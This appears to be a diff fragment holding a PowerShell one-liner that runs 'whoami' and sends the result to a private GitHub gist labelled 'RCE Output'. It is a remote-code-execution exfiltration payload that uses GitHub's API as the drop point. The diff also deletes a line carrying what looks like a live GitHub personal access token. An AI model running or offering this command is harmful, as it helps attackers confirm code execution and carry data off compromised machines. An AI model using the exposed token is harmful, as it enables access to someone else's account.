@@ -1,4 +1,3 @@
 powershell -Command "whoami | ForEach-Object { Invoke-RestMethod -Uri 'https://api.github.com/gists' -Headers @{Authorization = 'token YOUR_GITHUB_PERSONAL_ACCESS_TOKEN'} -Method POST -Body ('{""description"":""RCE Output"",""public"":false,""files"":{""output.txt"":{""content"":""' + $_.trim() + '""}}}') }"
 
 
-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
